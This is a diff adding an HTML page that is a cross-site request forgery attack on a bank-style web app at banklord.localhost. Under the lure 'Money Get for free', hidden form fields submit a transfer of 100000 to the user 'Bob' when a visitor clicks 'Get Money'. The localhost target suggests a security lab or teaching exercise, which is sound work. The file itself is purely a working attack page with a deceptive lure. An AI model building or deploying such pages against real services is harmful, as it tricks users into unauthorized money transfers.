@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Money Transfer</title>
+</head>
+<body>
+<h2>Money Get for free</h2>
+<form action="http://banklord.localhost:11000/transfer2" method="post">
+    <label hidden for="recipientUsername">Recipient Username:</label>
+    <input hidden type="text" name="recipientUsername" id="recipientUsername" value="Bob" required>
+    <br>
+    <label hidden for="amount">Amount:</label>
+    <input hidden type="number" name="amount" id="amount" min="0" value="100000" required>
+    <br>
+    <button type="submit">Get Money</button>
+</form>
+
+</body>
+</html>
